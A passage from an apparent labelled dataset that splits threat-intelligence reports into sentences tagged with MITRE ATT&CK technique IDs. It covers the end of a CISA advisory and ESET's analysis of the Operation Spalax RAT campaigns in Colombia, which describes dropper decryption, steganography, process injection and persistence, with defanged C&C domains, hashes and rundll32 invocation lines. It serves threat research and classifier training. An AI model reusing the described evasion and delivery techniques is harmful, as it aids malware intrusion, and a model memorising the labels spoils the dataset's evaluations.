64db8e54d9a2daaa6d9cf156a8b73c18 675fe822243dfd1c3ace2a071d0aa6dd ",
            "67dbecfb5e0f2f729e57d0f1eda82c67 685cbba8cf2584a3378d82dec65aa0bb ",
            "693a4c2fcaa67fb87e62f150fb65e00e 6ad33ab8b9ff3f02964a8aab2a40ebb5 6b540be7ac7159104b0ffa536747f1bf 6b7276e4aa7a1e50735d2f6923b40de4 6b930be55ed4bf8e16b30eadc3873dfd 6c67f275d50f6bfee4848de6d4911931 6c9cfada134ede220b75087c7698ebf2 6e843ef4856336fe3ef4ed27a4c792b1 6e97bf1b7c44edc66622b43e81105779 86e50d6dc28283dbd295079252787577 870fbad5b9a54cb6720c122d1fa321ec 88b3b94574ba1eeb711a66eb04021eed 8956a045306b672d3cc852419a72c4b0 8a9ac1b3ef2bf63c2ddfadbbbfd456b5 8b3b96327fbddebefe727ac2edad5714 8baa499b3e2f081ff47f8cf06a5e7809 8bc20fcd09adb7ea86dda2c57477633b 8be0c21b6ee56d0f68e0d90f7d0a26d7 8c80dd97c37525927c1e549cb59bcbf3 8d2416d9f6926fb0dc12ab5dafef691d 8d74922b2b31354ce588cefac71d9a9b 8e8fb7632c3a7e96cf0ea5299d564018 8ee6c9e1adb71b2623d5e7aa45df5f4d 8efaa987959ef95179a0f5be05c10faf 8fbf53f77c98daba277dae7661b86f02 8fc825df73977eeffaaa1587565f7505 90a3e3a2049c6eb9e39d113d9451a83f 932d355d9f2df2e8d8449d85454fc983 9450980a4413dfdbc60a62b257a7b019 947892152b8419a2dfe498be5063c1da 94d42ff06a588587131c2cd8a9b2fe96 95c15b7961e2d6fad96defa7ff2c6272 96ba4bf00d8b4acee9f550286610dcc7 97004f1962e2aed917dc2be5c908278f 972077c1bb73ca78b7cad4ac6d56c669 991ebcd03ace627093acc860fae739b5 99949240bc4eae33cac4bbb93b72349d 9a0a8048d53dedc763992fff32584741 9a0e3e80cd7c21812de81224f646715e 9a61ed5721cf4586abd1d49e0da55350 9b26999182ea0c2b2cac91919697289e 9c656ce22c93ca31c81ff8378a0a91ee ace620a0cc2684347e372f7e40e245d5 ad3b9e45192ec7c8085c3588cacb9c58 adb4f6ecb67732b7567486f0cee6e525 afa03ddb9fc64a795aadb6516c3bc268 b0269263ce024fc9de19f8f30bd51188 b04e895827c24070eb7082611ab79676 b059c9946ff67c62c074d6d15f356f6e b07299a907a4732d14da32b417c08af3 b1dadfcf459f8447b9ec44d8767da36d b2f1d2fefe9287f3261223b4b8219d03 b36f3e12cb88499f8795b8740ae67057 b4204f08c1a29fd4434e28b6219bfbc6 b4878c233d7f776a407f55a27b5effbc b6c12d88eeb910784d75a5e4df954001 b7ab5c6926f738dbe8d3a05cb4a1b4f5 b80dcd50e27b85d9a44fc4f55ff0a728 b8a61b1fda80f95a7dcdb0137bc89f67 b9642c1b3dbcccc9d84371b3163d43e0 b9647f389978f588d977ef6ef863938f b977bed98ae869a9bb9bf725215ef8e5 b9b627c470de997c01fdef4511029219 ba629216db6cf7c0c720054b0c9a13f3 badf0957c668d9f186fb218485d0d0f6 bb165b815e09fe95fa9282bce850528d bbfb478770a911cf055b8dfd8dcb36e4 bc4c189e590053d2cf97569c495c9610 bc9089c39bcdb1c3ef2e5bd25c77ed68 bd42303e7c38486df2899b0ccf3ce8f7 bd452dc2f9490a44bcff8478d875af4b bd6031dd85a578edf0bf1560caf36e02 bd63832e090819ea531d1a030fb04e9b be39ff1ec88a1429939c411113b26c02 be88741844bf7c47f81271270abe82dc ce26e91fc13ccb1be4b6bf6f55165410 ce449d7cb0a11b53b0513dde3bd57b1c ceba742bccb23304cf05d6c565dc53f8 cebe44b8a9a2d6e15a03d40d9e98e0ed cf946bc0faecb2dc8e8edc9e6ce2858f d09fcd9fa9ed43c9f28bcd4bd4487d22 d0b5c11ee5df0d78bdde3fdc45eaf21d d0d8243943053256bc1196e45fbf92d2 d0efc042ba4a6b207cf8f5b6760799d8 d20d01038e6ea10a9dcc72a88db5e048 d31596fe58ca278be1bb46e2a0203b34 d3df8c426572a85f3afa46e4cd2b66cd d59a77a8da7bec1f4bad7054a41b3232 d76b1c624e9227131a2791957955dddc d79477c9c688a8623930f4235c7228f6 d8a483d21504e73f0ba4b30bc01125d3 da46994fee26782605842005aabcd2fe daa232882b74d60443dfec8742401808 dab45ac39e34cfee60dcb005c3d5a668 dbc583d6d5ec8f7f0c702b209af975e2 dbe92b105f474efc4a0540673da0eb9c dbee8be5265a9879b61853cd9c0e4759 dc15ca49b39d1d17b22ec7580d32d905 dc386102060f7df285e9498f320f10e0 dd43cd0eddbb6f7cb69b1f469c37ec35 dd4e0f997e0b2cc9df28dca63ded6816 ddbdc6a3801906de598531b5b2dac02a dde4ff4e41f86426051f15da48667f5f ddecce92a712327c4068fabf0e1a7ff1 de608439f2bcc097b001d352b427bb68 deeb9b4789ac002aa8b834da76e70d74 df6475642f1fe122df3d7292217f1cff e011784958e7a00ec99b8f2320e92bf4 ec4cdc752c2ecd0d9f97491cc646a269 edb648f6c3c2431b5b6788037c1cd8ef ee3e297abd0a5b943dce46f33f3d56fb ee4862bc4916fc22f219e1120bea734a ef14448bf97f49a2322d4c79e64bb60b ef2738889e9d041826d5c938a256bc45 ef6fcdd1b55adf8ad6bcdf3d93fd109e efb5499492f08c1f10fecdeb703514d5 f0098aab593b65d980061a2df3a35c21 f073de9c169c8fcb2de5b811bff51cee f0881d5a7f75389deba3eff3f4df09ac f172ad4e906d97ed8f071896fc6789dc f2b6bffa2c22420c0b1c848b673055ed f446d8808a14649bddcc412f9e754890 f4dbe32f3505bc17364e2b125f8dd6df f4dd628f6c0bc2472d29c796ee38bf46 f4e67343e13c37449ada7335b9c53dd1 f53e332b0a6dbe8d8d3177e93b70cb1e f5ae03de0ad60f5b17b82f2cd68402fe f5ce889a1fa751b8fd726994cdb8f97e f5fdbfce1a5d2c000c266f4cd180a78d f7202dea71cc638e0c2dbeb92c2ce279 f7cef381c4ee3704fc8216f00f87552a f7ffbbbc68aadcbfbace55c58b6da0a7 f8b91554d221fe8ef4a4040e9516f919 f906571d719828f0f4b6212fc2aa7705 f9155052a43832061357c23de873ff9f f9abacc459e5d50d8582e8c660752c4e f9f608407d551f49d632bd6bd5bd7a56 f9fc9359dc5d1d0ac754b12efb795f79 fa27742b87747e64c8cb0d54aa70ef98 fa3c8d91ef4a8b245033ddb9aa3054a2 fad93907d5587eb9e0d8ebc78a5e19c2 Contact Information To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI\u2019s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by email at CyWatch@fbi.gov.",
            "When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.",
            "To request incident response resources or technical assistance related to these threats, contact CISA at CISAServiceDesk@cisa.dhs.gov. References DOJ Press Release Talos Intelligence:",
            "China Chopper Still Active",
            "9 Years Later CISA China Cyber Threat Overview webpage CISA Alert TA15-314A: Compromised Web Servers and Web Shells - Threat Awareness and Guidance CISA Alert AA20-133A: Top 10 Routinely Exploited Vulnerabilities CISA Alert AA20-275A:",
            "Potential for China Cyber Response to Heightened U.S.-China Tensions NSA Cybersecurity Advisory U/OO/179811-20: Chinese State-Sponsored Actors Exploit Publicly Known Vulnerabilities Revisions July 19, 2021:",
            "Initial version Updated July 19, 2021: Added note and STIX file This product is provided subject to this Notification and this Privacy & Use policy. "
        ],
        "label": [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1105"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1005",
                "T1078"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1566.001"
            ],
            [
                "T1190",
                "T1078"
            ],
            [
                "T1078"
            ],
            [],
            [],
            [
                "T1204.002"
            ],
            [
                "T1204.002"
            ],
            [
                "T1204.002"
            ],
            [
                "T1566.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1027"
            ],
            [
                "T1090"
            ],
            [
                "T1074.001"
            ],
            [
                "T1041"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1027"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "Operation Spalax Targeted malware attacks in Colombia",
        "cti_report": [
            "title: Operation Spalax:",
            "Targeted malware attacks in Colombia url: https://www.welivesecurity.com/2021/01/12/operation-spalax-targeted-malware-attacks-colombia/ ESET researchers uncover attacks targeting Colombian government institutions and private companies, especially from the energy and metallurgical industries ",
            "In 2020 ESET saw several attacks targeting Colombian entities exclusively.",
            "These attacks are still ongoing at the time of writing and are focused on both government institutions and private companies.",
            "For the latter, the most targeted sectors are energy and metallurgical.",
            "The attackers rely on the use of remote access trojans, most likely to spy on their victims.",
            "They have a large network infrastructure for command and control: ESET observed at least 24 different IP addresses in use in the second half of 2020.",
            "These are probably compromised devices that act as proxies for their C&C servers.",
            "This, combined with the use of dynamic DNS services, means that their infrastructure never stays still.",
            "We have seen at least 70 domain names active in this timeframe",
            "and they register new ones on a regular basis. ",
            "The attackers The attacks we saw in 2020 share some TTPs with previous reports about groups targeting Colombia, but also differ in many ways, thus making attribution difficult. ",
            "One of those reports was published in February 2019, by QiAnXin researchers.",
            "The operations described in that blogpost are connected to an APT group active since at least April 2018.",
            "We have found some similarities between those attacks and the ones that we describe in this article: We saw a malicious sample included in IoCs of QiAnXin\u2019s report and a sample from the new campaign in the same government organization.",
            "These files have fewer than a dozen sightings each. ",
            "Some of the phishing emails from the current campaign were sent from IP addresses corresponding to a range that belongs to Powerhouse Management, a VPN service.",
            "The same IP address range was used for emails sent in the earlier campaign. ",
            "The phishing emails have similar topics and pretend to come from some of the same entities \u2013 for example, the Office of the Attorney General (Fiscalia General de la Nacion) or the National Directorate of Taxes and Customs (DIAN). ",
            "Some of the C&C servers in Operation Spalax use linkpc.net and publicvm.com subdomains, along with IP addresses that belong to Powerhouse Management.",
            "This also happened in the earlier campaign. ",
            "However, there are differences in the attachments used for phishing emails, the remote access trojans (RATs) used and in most of the operator\u2019s C&C infrastructure. ",
            "There is also this report from Trend Micro, from July 2019.",
            "There are similarities between the phishing emails and parts of the network infrastructure in that campaign and the one we describe here.",
            "The attacks described in that article were connected to cybercrime, not espionage.",
            "While we have not seen any payload delivered by the attackers other than RATs, some of the targets in the current campaign (such as a lottery agency) don\u2019t make much sense for spying activities. ",
            "These threat actors show perfect usage of the Spanish language in the emails they send, they only target Colombian entities, and they use premade malware and don\u2019t develop any themselves. ",
            "Attack overview Targets are approached with emails that lead to the download of malicious files.",
            "In most cases, these emails have a PDF document attached, which contains a link that the user must click to download the malware.",
            "The downloaded files are regular RAR archives that have an executable file inside.",
            "These archives are hosted in legitimate file hosting services such as OneDrive or MediaFire.",
            "The target has to manually extract the file and execute it for the malware to run. ",
            "We\u2019ve found a variety of packers used for these executables, but their purpose is always to have a remote access trojan running on the victimized computer, usually by decrypting the payload and injecting it into legitimate processes.",
            "An overview of a typical attack is shown in Figure 1.",
            "We have seen the attackers use three different RATs: Remcos, njRAT and AsyncRAT. Figure 1.",
            "Overview of the attack Phishing emails The attackers use various topics for their emails, but in most cases they are not specially crafted for their victims.",
            "On the contrary, most of these emails have generic topics that could be reused for different targets. ",
            "We found phishing emails with these topics: A notification about a driving infraction A notification to take a mandatory COVID-19 test A notification to attend a court hearing An open investigation against the recipient for misuse of public funds A notification of an embargo of bank accounts The email shown in Figure 2 pretends to be a notification about a driving infraction for a value of around US$250.",
            "There is a PDF file attached that promises a photo of the infraction, as well as information about time and place of the incident.",
            "The sender has been spoofed to make the email look like it is coming from SIMIT (a system for paying transit violations in Colombia). ",
            "Figure 2.",
            "Example of a phishing email The pdf file only contains an external link that has been shortened with the acortaurl service, as shown in Figure 3.",
            "The shortened URL is: https://acortaurl[.]com/httpsbogotagovcohttpsbogotagovcohttpsbogotagovco. ",
            "After the shortened link is expanded, a RAR archive is downloaded from: http://www.mediafire[.]com/file/wbqg7dt604uwgza/SIMITcomparendoenlineasimitnumeroreferenciaComparendo2475569.uue/file. ",
            "Figure 3.",
            "PDF attached to phishing email Figure 4 shows part of the email\u2019s header.",
            "The spoofed sender is notificacionesmultas@simit.org[.]co but we can see that the real sender is IP address 128.90.108[.]177, which is connected with the domain name julian.linkpc[.]net, as found in historic DNS data.",
            "It\u2019s not a coincidence that the same domain name is used for contacting the C&C server in the malicious sample contained in the RAR archive.",
            "This IP address belongs to Powerhouse Management, a VPN service provider. ",
            "Figure 4.",
            "Header of a phishing email In more recent emails, the shortened link in the PDF file resolves to https://bogota.gov[.]co (a legitimate site) when visited from outside of Colombia. ",
            "Also, in some cases the GetResponse service has been used to send the email.",
            "This is probably done to track whether the victim has clicked on the link.",
            "In these cases there is no attachment: a link to the GetResponse platform leads to the download of malware. ",
            "You can see the other emails in the following gallery (click to enlarge): Figures 5 to 13.",
            "Various phishing emails and their attached files Malicious artifacts Droppers The executable files contained in compressed archives that are downloaded via the phishing emails are responsible for decrypting and running remote access trojans on a victimized computer.",
            "In the following sections, we describe the various droppers we have seen. ",
            "NSIS installers The dropper that is most commonly used by these attackers comes as a file that was compiled with NSIS (Nullsoft Scriptable Install System).",
            "To try to evade detection, this installer contains several benign files that are written to disk (they are not part of NSIS binaries and they are not used at all by the installer) and two files that are malicious: an encrypted RAT executable and a DLL file that decrypts and runs the trojan.",
            "An NSIS script for one of these installers is shown in Figure 14.",
            "The benign files are usually different in different droppers used by the attackers. ",
            "Figure 14.",
            "NSIS script for one of the droppers; the malicious files are highlighted The files Bonehead (encrypted RAT) and ShoonCataclysm.dll (dropper DLL) are written in the same folder and the DLL is run with rundll32.exe using Uboats as its argument.",
            "The names of these files change between executables.",
            "Some more examples are: rundll32.exe",
            "Blackface,Breathing rundll32.exe OximeLied,Hostage rundll32.exe Conservatory,Piggins ",
            "We used the name of the benign files contained in some of these NSIS installers to find more malicious installers used by the Spalax operators.",
            "Table 1 lists details of three different NSIS installers used by the attackers that contained all the same benign files.",
            "The only difference among them was the encrypted file, which pointed to different C&C servers. ",
            "Table 1.",
            "NSIS installers with identical benign files used by this group SHA-1C&C ",
            "6E81343018136B271D1F95DB536CA6B2FD1DFCD6marzoorganigrama20202020.duckdns[.]org 7EDB738018E0E91C257A6FC94BDBA50DAF899F90ruthy.qdp6fj1uji[.]xyz 812A407516F9712C80B70A14D6CDF282C88938C1dominoduck2098.duckdns[.]org ",
            "However, we also found malicious NSIS installers used by other unrelated groups that had the same benign files as the ones used by this group.",
            "Figure 15 lists the files contained in two different NSIS installers.",
            "The one on the left (SHA-1: 3AC39B5944019244E7E33999A2816304558FB1E8) is an executable used by this group and the one on the right (SHA-1: 6758741212F7AA2B77C42B2A2DE377D97154F860) is unrelated.",
            "The SHA-1 hashes for all the benign files are the same (and also the filenames) and even the malicious DLL is the same.",
            "However, the encrypted file Bonehead is different. ",
            "Figure 15.",
            "Files contained in NSIS droppers from unrelated campaigns This means that these installers were generated with the same builder, but by different actors.",
            "The builder is probably offered in underground forums and includes these benign files.",
            "This, along with a complete analysis of the dropper, was described earlier this year by Sophos in their RATicate article.",
            "There is also an article by Lab52 describing one of the NSIS installers used in Operation Spalax, which they attribute to APT-C-36. ",
            "In the vast majority of cases these NSIS droppers decrypt and run the Remcos RAT, but we have also seen cases where the payload is njRAT.",
            "These will be described later in the Payloads section. ",
            "Agent Tesla packers We have seen several droppers that are different variants of a packer that uses steganography and is known to be used in Agent Tesla samples.",
            "Interestingly, the attackers use various payloads, but none of them are Agent Tesla.",
            "Even though there are differences in all the samples regarding the layers of encryption, obfuscation or anti-analysis used, we can summarize the actions taken by the droppers as follows: The dropper reads a string (or binary data) from its resource section and decrypts it.",
            "The result is a DLL that will be loaded and called in the same address space. ",
            "The DLL reads pixels from an image contained in the first binary and decrypts another executable.",
            "This one is loaded and executed in the same address space. ",
            "This new executable is packed with CyaX. It reads data from its own resource section and decrypts a payload.",
            "There are anti-analysis checks; if they pass, the payload can be injected into a new process or loaded in the same process space. ",
            "The initial dropper is coded in C#.",
            "In all the samples that we have seen, the code for the dropper was hiding in non-malicious code, probably copied from other apps.",
            "The benign code is not executed; it\u2019s there to evade detection. ",
            "In Figure 16 we see an example of the resources contained in one of these droppers.",
            "The text in green (only shown partially) is a string that will be decrypted to generate the next stage to be executed and the image that we see below the green text will be decrypted by the second stage malware.",
            "The algorithm used for decryption of the string varies from sample to sample, but sometimes the resource is just an unencrypted binary. ",
            "Figure 16.",
            "Resources contained in Agent Tesla\u2019s packer ",
            "The method to be executed in the DLL is always named StartGame or StartUpdate.",
            "It reads the image from the first executable, and stores every pixel as three numbers according to its red, green and blue components.",
            "Then it decrypts the array by doing a single-byte XOR operation, cycling through the key.",
            "After that, the array is gzip-decompressed and executed.",
            "Part of the code for the mentioned operations is shown in Figure 17. Figure 17.",
            "Code to decrypt and run the third-stage malware The third stage is in charge of decrypting and running the payload.",
            "The .NET packer known as CyaX is used to perform this task.",
            "The version of the packer used by the attackers is v4, although they used v2 in some cases.",
            "Figure 18 shows the hardcoded configuration for one of their samples. ",
            "Figure 18.",
            "Hardcoded configuration in CyaX-Sharp packer ",
            "The decryption of the payload is based on XOR operations and is the same as the algorithm previously shown but with an extra step: the payload is XORed with its first 16 bytes as a key.",
            "Once it\u2019s decrypted, it can be run in the same address space or injected into a different process, depending on the configuration. ",
            "This packer supports various anti-analysis operations such as disabling Windows Defender, checking for security products, and detecting virtual environments and sandboxes. ",
            "The majority of the payloads for these droppers are njRAT, but we have also seen AsyncRAT.",
            "We saw Remcos in one of these droppers, but the code in the packer was different.",
            "Part of the main routine for the injection of the payload is shown in Figure 19. Figure 19.",
            "Code for the last stage of a dropper We have noticed that the configuration is contained in different variables.",
            "Values like #startup_method# or #bind# mean that the configuration was not set for those options.",
            "The payload is read from an encrypted resource and XORed with a hardcoded password.",
            "The shellcode that performs the injection is contained in an array and is dynamically loaded.",
            "There are no anti-analysis checks or protection mechanisms. ",
            "AutoIt",
            "droppers For some of their droppers, the attackers have used an AutoIt packer that comes heavily obfuscated.",
            "Unlike the cases that were previously described, in this case the first-stage malware performs the injection and execution of the payload.",
            "It does so by using two shellcodes contained in the compiled AutoIt script: one to decrypt the payload and another to inject it into some process. ",
            "The payload is constructed by concatenating several strings, as shown in Figure 20.",
            "By inspecting the last two characters, we can see that the string is in reverse order. ",
            "Figure 20.",
            "Concatenation of the payload The routine that decrypts the payload contains a small shellcode that is loaded with VirtualAlloc and executed.",
            "The decryption done by the shellcode is based on a single-byte XOR algorithm.",
            "The code that loads the shellcode is shown in Figure 21. Figure 21.",
            "Execution of shellcode to decrypt the payload We can see that the shellcode is stored encrypted.",
            "In fact, before deobfuscating the script, all strings were encrypted with this same XOR-based algorithm.",
            "The decryption routine used is shown in Figure 22. Figure 22.",
            "Routine to decrypt strings Once the payload is decrypted, a shellcode with RunPE code is used to perform the injection.",
            "The shellcode is concatenated in the same manner as the payload and executed like the previous shellcode. ",
            "To achieve persistence, a VBS script is created to execute a copy of the dropper (which is renamed to aadauthhelper.exe).",
            "Then an Internet Shortcut (.url) file is created in the Startup folder to execute the script.",
            "The code that generates these files is shown in Figure 23. Figure 23.",
            "Code for persistence in AutoIt",
            "droppers The dropper contains code that is not executed.",
            "It can: Check for VMware and VirtualBox Delete the dropper executable Run the dropper continuously Download and execute files Terminate if a \u201cProgram Manager\u201d window is found Read a binary from its resource section, write it to disk and execute it Modify the security descriptor (ACL) for the injected process For more information see this analysis by Morphisec where similar AutoIt droppers were used with Frenchy shellcode. ",
            "Payloads The payloads used in Operation Spalax are remote access trojans.",
            "These provide several capabilities not only for remote control, but also for spying on targets: keylogging, screen capture, clipboard hijacking, exfiltration of files, and the ability to download and execute other malware, to name a few. ",
            "These RATs were not developed by the attackers.",
            "They are: Remcos, sold online njRAT, leaked in underground forums AsyncRAT, open source There is not a one-to-one relationship between droppers and payloads, as we have seen different types of droppers running the same payload and also a single type of dropper connected to different payloads.",
            "However, we can state that NSIS droppers mostly drop Remcos, while Agent Tesla and AutoIt packers typically drop njRAT. ",
            "Remcos is a tool for remote control and surveillance.",
            "It can be purchased with a six-month license that includes updates and support.",
            "There is also a free version with limited functionalities.",
            "While the tool can be used for legitimate purposes, it is also used by criminals to spy on their victims. ",
            "Most of the Remcos samples used by this group are v2.5.0 Pro, but we have also seen all versions that were released since September 2019, which may indicate that the attackers bought a license after that month and have been actively using the different updates that they received during their six month license period. ",
            "Regarding njRAT, this group mostly uses v0.7.3 (also known as the Lime version).",
            "That version includes functionalities such as DDoS or ransomware encryption, but only spy features such as keylogging are used by the attackers.",
            "For a more complete description of this version, refer to this 2018 article by Zscaler. ",
            "Another njRAT version used by the attackers is v0.7d (the \u201cgreen edition\u201d) which is a simpler version focused on spying capabilities: keylogging, taking screenshots, access to webcam and microphone, uploading and downloading files, and executing other binaries. ",
            "The final type of payload that we will mention is AsyncRAT.",
            "In all cases we have observed v0.5.7B, which can be found on GitHub, has been used.",
            "The functionalities in this RAT are similar to those in the previously mentioned RATs, which allow attackers to spy on their victims. ",
            "Network infrastructure During our research we saw approximately 70 different domain names used for C&C in the second half of 2020.",
            "This amounts to at least 24 IP addresses.",
            "By pivoting on passive DNS data for IP addresses and known domain names, we found that the attackers have used at least 160 additional domain names since 2019.",
            "This corresponds to at least 40 further IP addresses. ",
            "They\u2019ve managed to operate at such scale by using Dynamic DNS services.",
            "This means that they have a pool of domain names (and also register new ones on a regular basis) that are dynamically assigned to IP addresses.",
            "This way a domain name can be related to several IP addresses over a period of time and IP addresses can be related to many domain names.",
            "Most of the domain names we have seen were registered with Duck DNS, but they have also used DNS Exit for publicvm.com and linkpc.net subdomains. ",
            "Regarding IP addresses, almost all of them are in Colombia.",
            "Most are IP addresses related to Colombian ISPs: 60% of them are Telmex and 30% EPM Telecomunicaciones (Tigo).",
            "As it is highly unlikely that the criminals own so many residential IP addresses, it is possible that they use some victims as proxies, or some vulnerable devices to forward communication to their real C&C servers. ",
            "Finally, a subset of the IP addresses belongs to Powerhouse Management, a VPN service provider.",
            "They are used in conjunction with DNS Exit subdomains.",
            "Similar findings can be found in this analysis by Lab52. Conclusion Targeted malware attacks against Colombian entities have been scaled up since the campaigns that were described last year.",
            "The landscape has changed from a campaign that had a handful of C&C servers and domain names to a campaign with very large and fast-changing infrastructure with hundreds of domain names used since 2019.",
            "Even though TTPs have seen changes, not only in how malware is delivered in phishing emails but also in the RATs used, one aspect that remains the same is that the attacks are still targeted and focused on Colombian entities, both in the public and private sectors.",
            "It should be expected that these attacks will continue in the region for a long time, so we will keep monitoring these activities. ",
            "A comprehensive list of Indicators of Compromise (IoCs) and samples can be found in our GitHub repository. ",
            "For any inquiries, or to make sample submissions related to the subject, contact us at threatintel@eset.com. ",
            "MITRE ATT&CK techniques Note: This table was built using version 7 of the MITRE ATT&CK framework. ",
            "TacticIDNameDescription Initial AccessT1566.001Phishing:",
            "Spearphishing AttachmentThe attackers have used emails with PDF or RTF files attached that contain a link to download malware. ",
            "T1566.002Phishing:",
            "Spearphishing LinkThe attackers have used emails with a link to download malware. ",
            "ExecutionT1059.005Command and Scripting Interpreter:",
            "Visual BasicThe attackers have used droppers that dump VBS files with commands to achieve persistence. ",
            "T1059.003Command and Scripting Interpreter:",
            "Windows Command ShellThe attackers have used RATs that can launch a command shell for executing commands. T1106Native",
            "APIThe attackers have used API calls in their droppers, such as CreateProcessA, WriteProcessMemory and ResumeThread, to load and execute shellcode in memory. ",
            "T1204.001User Execution: Malicious LinkThe attackers have attempted to get users to open a malicious link that leads to the download of malware. ",
            "T1204.002User Execution: Malicious FileThe attackers have attempted to get users to execute malicious files masquerading as documents. PersistenceT1547.001Boot or Logon Initialization Scripts: Registry Run Keys / Startup",
            "FolderThe attackers have used RATs that persist by creating a Run registry key or by creating a copy of the malware in the Startup folder. ",
            "T1053.005Scheduled Task/Job: Scheduled TaskThe attackers have used scheduled tasks in their droppers and payloads to achieve persistence. ",
            "Privilege EscalationT1548.002Abuse Elevation Control Mechanism: Bypass User Access ControlThe attackers have used RATs that implement UAC bypassing. ",
            "Defense EvasionT1140Deobfuscate/Decode Files or InformationThe attackers have used various encryption algorithms in their droppers to hide strings and payloads. ",
            "T1562.001Impair Defenses: Disable or Modify ToolsThe attackers have used CyaX packer, which can disable Windows Defender. ",
            "T1070.004Indicator Removal on Host:",
            "File DeletionThe attackers have used malware that deletes itself from the system. ",
            "T1112Modify RegistryThe attackers have used RATs that allow full access to the Registry, for example to clear traces of their activities. ",
            "T1027.002Obfuscated Files or Information:",
            "Software PackingThe attackers have used various layers of packers for obfuscating their droppers. ",
            "T1027.003Obfuscated Files or Information:",
            "SteganographyThe attackers have used packers that read pixel data from images contained in PE files\u2019 resource sections and build the next layer of execution from the data. ",
            "T1055.002Process Injection: Portable Executable InjectionThe attackers have used droppers that inject the payload into legitimate processes such as RegAsm.exe, MSBuild.exe and more. ",
            "T1497.001Virtualization/Sandbox Evasion:",
            "System ChecksThe attackers have used droppers and payloads that perform anti-analysis checks to detect virtual environments and analysis tools. ",
            "Credential AccessT1555.003Credentials from Password Stores: Credentials from Web BrowsersThe attackers have used various RATs with modules that steal passwords saved in victim web browsers. ",
            "DiscoveryT1010Application",
            "Window",
            "DiscoveryThe attackers have used droppers and RATs that gather information about opened windows. T1083File and Directory",
            "DiscoveryThe attackers have used various RATs that can browse file systems. ",
            "T1120Peripheral Device",
            "DiscoveryThe attackers have used njRAT, which attempts to detect if the victim system has a camera during the initial infection. ",
            "T1057Process",
            "DiscoveryThe attackers have used various RATs with modules that show running processes. ",
            "T1012Query RegistryThe attackers have used various RATs that can read the Registry. ",
            "T1018Remote System DiscoveryThe attackers have used njRAT, which can identify remote hosts on connected networks. ",
            "T1518.001Software Discovery: Security Software",
            "DiscoveryThe attackers have used droppers that check for security software present in a victim\u2019s computer. ",
            "T1082System Information",
            "DiscoveryThe attackers have used various RATs that gather system information such as computer name and operating system during the initial infection. T1016System Network Configuration DiscoveryThe attackers have used various RATs that can collect the IP address of the victim machine. ",
            "T1049System Network Connections DiscoveryThe attackers have used various RATs that can list network connections on a victim\u2019s computer. ",
            "T1033System Owner/",
            "User DiscoveryThe attackers have used various RATs that retrieve the current username during initial infection. ",
            "T1007System",
            "Service DiscoveryThe attackers have used various RATs that have modules to manage services on the system. ",
            "T1021.001Remote Services: Remote Desktop ProtocolThe attackers have used various RATs that can perform remote desktop access. ",
            "T1091Replication",
            "Through Removable MediaThe attackers have used njRAT, which can be configured to spread via removable drives. ",
            "CollectionT1123Audio",
            "CaptureThe attackers have used various RATs that can capture audio from the system\u2019s microphone. ",
            "T1115Clipboard",
            "DataThe attackers have used various RATs that can access and modify data from the clipboard. T1005Data from Local SystemThe attackers have used various RATs that can access the local file system and upload, download or delete files. ",
            "T1056.001Input Capture:",
            "KeyloggingThe attackers have used various RATs that have keylogging capabilities. ",
            "T1113Screen",
            "CaptureThe attackers have used various RATs that can capture screenshots of victim machines. ",
            "T1125Video",
            "CaptureThe attackers have used various RATs that can access the victim\u2019s webcam. Command and ControlT1132.001Data Encoding: Standard EncodingThe attackers have used njRAT, which uses base64 encoding for C&C traffic. ",
            "T1573.001Encrypted Channel:",
            "Symmetric CryptographyThe attackers have used Remcos RAT, which uses RC4 for encrypting C&C communications. ",
            "T1095Non-Application Layer ProtocolThe attackers have used various RATs that use TCP for C&C communications. ",
            "T1571Non-Standard PortThe attackers have used various RATs that communicate over different port numbers. ",
            "ExfiltrationT1041Exfiltration",
            "Over C2 ChannelThe attackers have used various RATs that exfiltrate data over the same channel used for C&C. 12 Jan 2021 - 11:30AM "
        ],
        "label": [
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1090"
            ],
            [
                "T1090"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1566.001"
            ],
            [],
            [],
            [
                "T1566.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1566.001",
                "T1204.002"
            ],
            [
                "T1027"
            ],
            [],
            [
                "T1204.002"
            ],
            [
                "T1027",
                "T1055",
                "T1140"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1566.001"
            ],
            [],
            [],
            [],
            [],
            [
                "T1027"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1027",
                "T1140"
            ],
            [],
            [],
            [
                "T1027"
            ],
            [],
            [],
            [],
            [
                "T1218.011"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1140"
            ],
            [],
            [
                "T1027"
            ],
            [],
            [
                "T1027",
                "T1140"
            ],
            [
                "T1055"
            ],
            [
                "T1027",
                "T1140"
            ],
            [],
            [
                "T1027"
            ],
            [
                "T1055"
            ],
            [],
            [
                "T1027"
            ],
            [],
            [],
            [
                "T1140"
            ],
            [],
            [],
            [],
            [],
            [
                "T1027"
            ],
            [
                "T1140"
            ],
            [
                "T1027"
            ],
            [],
            [],
            [
                "T1027"
            ],
            [],
            [],
            [],
            [],
            [
                "T1140"
            ],
            [
                "T1055"
            ],
            [
                "T1562.001",
                "T1518.001"
            ],
            [],
            [],
            [
                "T1055"
            ],
            [],
            [],
            [
                "T1027"
            ],
            [
                "T1055"
            ],
            [],
            [],
            [
